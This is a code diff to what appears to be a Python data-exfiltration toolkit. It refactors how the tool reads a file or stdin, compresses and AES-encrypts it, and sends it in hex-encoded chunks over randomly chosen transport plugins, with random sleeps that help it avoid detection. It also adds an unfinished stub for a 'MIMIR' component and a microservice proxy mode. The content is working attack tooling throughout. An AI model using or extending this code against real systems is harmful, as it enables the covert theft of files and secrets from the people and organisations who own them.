@@ -265,54 +265,25 @@ class ExfiltrateFile(threading.Thread):
         self.daemon = True
 
     def run(self):
-        # checksum
-        if self.file_to_send == 'stdin':
-            file_content = sys.stdin.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
-        else:
-            with open(self.file_to_send, 'rb') as f:
-                file_content = f.read()
-            buf = StringIO(file_content)
-            e = StringIO(file_content)
-        self.checksum = md5(buf)
-        del file_content
-
-        # registering packet
+        packet_index = -1
         plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-        ok("Using {0} as transport method".format(plugin_name))
 
-        warning("[!] Registering packet for the file")
-        data = "%s|!|%s|!|REGISTER|!|%s" % (
-            self.jobid, os.path.basename(self.file_to_send), self.checksum)
+        data, f = get_next_data(self.file_to_send, packet_index, plugin_name, None, self.exfiltrate.KEY, self.jobid)
         plugin_send_function(data)
+
+        packet_index += 1
 
         time_to_sleep = uniform(0, MAX_TIME_SLEEP)
         info("Sleeping for %s seconds" % time_to_sleep)
         time.sleep(time_to_sleep)
 
-        # sending the data
-        f = tempfile.SpooledTemporaryFile()
-        data = e.read()
-        if COMPRESSION:
-            data = compress(data)
-        f.write(aes_encrypt(data, self.exfiltrate.KEY))
-        f.seek(0)
-        e.close()
-
-        packet_index = 0
         while (True):
-            data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
-            if not data_file:
+            data, _ = get_next_data(self.file_to_send, packet_index, plugin_name, f, self.exfiltrate.KEY, self.jobid)
+            if data == None:
                 break
             plugin_name, plugin_send_function = self.exfiltrate.get_random_plugin()
-            ok("Using {0} as transport method".format(plugin_name))
-            # info("Sending %s bytes packet" % len(data_file))
-
-            data = "%s|!|%s|!|%s" % (self.jobid, packet_index, data_file)
             plugin_send_function(data)
             packet_index = packet_index + 1
-
             time_to_sleep = uniform(0, MAX_TIME_SLEEP)
             display_message("Sleeping for %s seconds" % time_to_sleep)
             time.sleep(time_to_sleep)
@@ -325,12 +296,58 @@ class ExfiltrateFile(threading.Thread):
         f.close()
         sys.exit(0)
 
+def get_next_data(file_to_send, packet_index, plugin_name, f, KEY, jobid):
+    if packet_index == -1:
+        # register!!
+        # checksum
+        if file_to_send == 'stdin':
+            file_content = sys.stdin.read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        else:
+            with open(file_to_send, 'rb') as f:
+                file_content = f.read()
+            buf = StringIO(file_content)
+            e = StringIO(file_content)
+        checksum = md5(buf)
+        del file_content
+
+        # registering packet
+        ok("Using {0} as transport method".format(plugin_name))
+
+        warning("[!] Registering packet for the file")
+        data1 = "%s|!|%s|!|REGISTER|!|%s" % (
+            jobid, os.path.basename(file_to_send), checksum)
+
+        # sending the data
+        f = tempfile.SpooledTemporaryFile()
+        data = e.read()
+        if COMPRESSION:
+            data = compress(data)
+        f.write(aes_encrypt(data, KEY))
+        f.seek(0)
+        e.close()
+        return data1,f
+    else:
+        # return actual data
+        data_file = f.read(randint(MIN_BYTES_READ, MAX_BYTES_READ)).encode('hex')
+        if not data_file:
+            return None, None
+        ok("Using {0} as transport method".format(plugin_name))
+        # info("Sending %s bytes packet" % len(data_file))
+        data = "%s|!|%s|!|%s" % (jobid, packet_index, data_file)
+        return data,None
+
 
 def signal_handler(bla, frame):
     global threads
     warning('Killing DET and its subprocesses')
     os.kill(os.getpid(), signal.SIGKILL)
 
+## TODO: this is how the main MIMIR component will request exfil components
+def mimir_DET_client():
+
+    pass
 
 def main():
     global MAX_TIME_SLEEP, MIN_TIME_SLEEP, KEY, MAX_BYTES_READ, MIN_BYTES_READ, COMPRESSION
@@ -353,6 +370,8 @@ def main():
                         dest="listen", default=False, help="Server mode")
     listenMode.add_argument('-Z', action="store_true",
                         dest="proxy", default=False, help="Proxy mode")
+    listenMode.add_argument('-M', action="store_true",
+                            dest="microservice", default=False, help="Special Model for MS applicatinos")
     results = parser.parse_args()
 
     if (results.config is None):
@@ -376,7 +395,7 @@ def main():
     app = Exfiltration(results, KEY)
 
     # LISTEN/PROXY MODE
-    if (results.listen or results.proxy):
+    if ((results.listen or results.proxy) and not results.microservice):
         threads = []
         plugins = app.get_plugins()
         for plugin in plugins:
@@ -387,6 +406,14 @@ def main():
             thread.daemon = True
             thread.start()
             threads.append(thread)
+    elif results.microservice:
+        plugins = app.get_plugins()
+        plugin = plugins[0]
+        thread = threading.Thread(target=plugins[plugin]['microserivce_proxy'], args=(app,results.file,))
+        #thread = ExfiltrateFile(app, file_to_send)
+        threads.append(thread)
+        thread.daemon = True
+        thread.start()
     # EXFIL mode
     else:
         if (results.folder is None and results.file is None):
